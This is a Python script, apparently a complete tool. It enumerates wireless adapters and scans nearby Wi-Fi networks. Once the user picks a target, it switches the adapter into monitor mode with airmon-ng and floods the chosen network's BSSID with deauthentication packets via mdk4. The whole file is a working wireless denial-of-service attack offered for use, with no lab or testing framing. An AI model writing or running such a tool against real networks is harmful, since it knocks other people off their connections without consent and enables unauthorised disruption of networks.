import os

class Disrupt:
    GREEN = '\033[32m'
    DEFAULT = '\033[39m'
    ORANGE = '\033[93m'
    RED = '\033[31m'

    def __init__(self):
        self.clear_screen()
        self.devices = self.get_devices()
        self.adapter = self.select_adapter()
        self.clear_screen()
        self.networks = self.get_networks()
        if not self.networks:
            input(f'{self.RED}No WIFI Networks FOUND{self.DEFAULT}, Press Enter To Exit')
            exit()
        self.display_networks()
        self.network = self.select_network()
        self.clear_screen()
        self.start_monitor_mode()
        self.display_network_details()
        self.flood_network()

    def clear_screen(self):
        os.system('clear')

    def get_devices(self):
        cmd = 'ifconfig'
        output = os.popen(cmd).read().split('\n\n')
        devices = [i.split(': ')[0] for i in output if 'wlan' in i]
        return devices

    def select_adapter(self):
        print('Select Adapter')
        for i, device in enumerate(self.devices):
            print(f'{self.GREEN}[{i}] - {device}{self.DEFAULT}')
        while True:
            try:
                adapter = int(input('\nSelect Adapter: '))
                if 0 <= adapter < len(self.devices):
                    return adapter
            except ValueError:
                print(f'{self.RED}Invalid input, try again.{self.DEFAULT}')

    def get_networks(self):
        cmd = 'nmcli --terse -f BSSID,SSID,CHAN,SIGNAL dev wifi'
        output = os.popen(cmd).read().strip().split('\n')
        networks = [line.replace('\\:', '..').split(':') for line in output if line]
        networks = {i: {'BSSID': n[0].replace('..', ':'), 'SSID': n[1], 'CHANNEL': n[2], 'SIGNAL': n[3]} for i, n in enumerate(networks)}
        return networks

    def display_networks(self):
        l_ssid = max(len(net['SSID']) for net in self.networks.values())
        print(f"NO.    BSSID{' ' * 16}SSID{' ' * (l_ssid)}SIG{' ' * 4}CHANNEL\n{'-' * (l_ssid + 46)}")
        for i, net in self.networks.items():
            signal_color = self.get_signal_color(int(net['SIGNAL']))
            print(f"{i:<3}    {net['BSSID']}    {net['SSID']:<{l_ssid}}    {signal_color}{net['SIGNAL']:<3}{self.DEFAULT}    {net['CHANNEL']}")

    def get_signal_color(self, signal_strength):
        if signal_strength > 50:
            return self.GREEN
        elif signal_strength > 30:
            return self.ORANGE
        else:
            return self.RED

    def select_network(self):
        while True:
            try:
                network = int(input('\nSelect Network: '))
                if 0 <= network < len(self.networks):
                    return self.networks[network]
            except ValueError:
                print(f'{self.RED}Invalid input, try again.{self.DEFAULT}')

    def start_monitor_mode(self):
        os.system(f'sudo airmon-ng start {self.devices[self.adapter]}')

    def display_network_details(self):
        net = self.network
        print(f"BSSID : {net['BSSID']}")
        print(f"SSID : {net['SSID']}")
        print(f"CHANNEL : {net['CHANNEL']}")
        print(f"SIGNAL : {net['SIGNAL']}\n")
        print(f"Flooding {self.GREEN}{net['SSID']} - {net['BSSID']}{self.DEFAULT} with Deauth Packets")

    def flood_network(self):
        cmd = f"sudo mdk4 {self.devices[self.adapter]}mon d -c {self.network['CHANNEL']} -B {self.network['BSSID']}"
        try:
            process = os.popen(cmd)
            while True:
                line = process.readline().strip()
                if line.startswith('Packets'):
                    print(f"{self.ORANGE}[+] {line}{self.DEFAULT}")
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()

    def cleanup(self):
        self.clear_screen()
        print(f'Disabling Monitor Mode On {self.devices[self.adapter]}')
        os.system(f'sudo airmon-ng stop {self.devices[self.adapter]}mon')
        self.clear_screen()

if __name__ == '__main__':
    Disrupt()
